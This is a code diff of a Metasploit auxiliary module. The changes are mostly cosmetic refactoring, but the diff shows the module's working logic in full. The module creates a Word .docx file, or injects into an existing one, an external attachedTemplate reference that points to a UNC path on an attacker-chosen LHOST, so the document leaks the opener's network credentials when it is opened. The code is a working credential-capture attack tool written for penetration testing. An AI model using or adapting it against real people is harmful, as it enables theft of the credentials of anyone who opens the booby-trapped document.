@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -14,12 +14,10 @@ require 'zip'
 # Project
 #
 
-require 'msf/core'
 # for creating files
 require 'rex/zip'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::FILEFORMAT
 
   def initialize(info = {})
@@ -46,14 +44,14 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.']),
+        OptAddressLocal.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.']),
         OptPath.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document.']),
         OptString.new('FILENAME', [true, 'Document output filename.', 'msf.docx']),
         OptString.new('DOCAUTHOR',[false,'Document author for empty document.']),
-      ], self.class)
+      ])
   end
 
-  #here we create an empty .docx file with the UNC path. Only done when FILENAME is empty
+  # here we create an empty .docx file with the UNC path. Only done when FILENAME is empty
   def make_new_file
     metadata_file_data = ""
     metadata_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><cp:coreProperties"
@@ -65,12 +63,12 @@ class Metasploit3 < Msf::Auxiliary
     metadata_file_data << "2013-01-08T14:14:00Z</dcterms:created><dcterms:modified xsi:type=\"dcterms:W3CDTF\">"
     metadata_file_data << "2013-01-08T14:14:00Z</dcterms:modified></cp:coreProperties>"
 
-    #where to find the skeleton files required for creating an empty document
+    # where to find the skeleton files required for creating an empty document
     data_dir = File.join(Msf::Config.data_directory, "exploits", "docx")
 
     zip_data = {}
 
-    #add skeleton files
+    # add skeleton files
     vprint_status("Adding skeleton files from #{data_dir}")
     Dir["#{data_dir}/**/**"].each do |file|
       if not File.directory?(file)
@@ -78,19 +76,19 @@ class Metasploit3 < Msf::Auxiliary
       end
     end
 
-    #add on-the-fly created documents
+    # add on-the-fly created documents
     vprint_status("Adding injected files")
     zip_data["docProps/core.xml"] = metadata_file_data
     zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
 
-    #add the otherwise skipped "hidden" file
+    # add the otherwise skipped "hidden" file
     file = "#{data_dir}/_rels/.rels"
     zip_data[file.sub(data_dir,'')] = File.read(file)
-    #and lets create the file
+    # and lets create the file
     zip_docx(zip_data)
   end
 
-  #here we inject an UNC path into an existing file, and store the injected file in FILENAME
+  # here we inject an UNC path into an existing file, and store the injected file in FILENAME
   def manipulate_file
     ref = "<w:attachedTemplate r:id=\"rId1\"/>"
 
@@ -99,24 +97,24 @@ class Metasploit3 < Msf::Auxiliary
       return nil
     end
 
-    #lets extract our docx and store it in memory
+    # lets extract our docx and store it in memory
     zip_data = unzip_docx
 
-    #file to check for reference file we need
+    # file to check for reference file we need
     file_content = zip_data["word/settings.xml"]
     if file_content.nil?
       print_error("Bad \"word/settings.xml\" file, check if it is a valid .docx.")
       return nil
     end
 
-    #if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
+    # if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
     if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
       vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
       zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
       # lets zip the end result
       zip_docx(zip_data)
     else
-      #now insert the reference to the file that will enable our malicious entry
+      # now insert the reference to the file that will enable our malicious entry
       insert_one = file_content.index("<w:defaultTabStop")
 
       if insert_one.nil?
@@ -135,16 +133,16 @@ class Metasploit3 < Msf::Auxiliary
         return nil
       end
 
-      #update the files that contain the injection and reference
+      # update the files that contain the injection and reference
       zip_data["word/settings.xml"] = file_content
       zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
-      #lets zip the file
+      # lets zip the file
       zip_docx(zip_data)
     end
     return 0
   end
 
-  #making the actual docx from the hash
+  # making the actual docx from the hash
   def zip_docx(zip_data)
     docx = Rex::Zip::Archive.new
     zip_data.each_pair do |k,v|
@@ -153,11 +151,11 @@ class Metasploit3 < Msf::Auxiliary
     file_create(docx.pack)
   end
 
-  #unzip the .docx document. sadly Rex::zip does not uncompress so we do it the Rubyzip way
+  # unzip the .docx document. sadly Rex::zip does not uncompress so we do it the Rubyzip way
   def unzip_docx
-    #Ruby sometimes corrupts the document when manipulating inside a compressed document, so we extract it with Zip::File
+    # Ruby sometimes corrupts the document when manipulating inside a compressed document, so we extract it with Zip::File
     vprint_status("Extracting #{datastore['SOURCE']} into memory.")
-    #we read it all into memory
+    # we read it all into memory
     zip_data = Hash.new
     begin
       Zip::File.open(datastore['SOURCE'])  do |filezip|
@@ -174,7 +172,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def run
-    #we need this in make_new_file and manipulate_file
+    # we need this in make_new_file and manipulate_file
     @rels_file_data = ""
     @rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>".chomp
     @rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">".chomp
@@ -182,11 +180,11 @@ class Metasploit3 < Msf::Auxiliary
     @rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
 
     if "#{datastore['SOURCE']}" == ""
-      #make an empty file
+      # make an empty file
       print_status("Creating empty document that points to #{datastore['LHOST']}.")
       make_new_file
     else
-      #extract the word/settings.xml and edit in the reference we need
+      # extract the word/settings.xml and edit in the reference we need
       print_status("Injecting UNC path into existing document.")
       if manipulate_file.nil?
         print_error("Failed to create a document from #{datastore['SOURCE']}.")
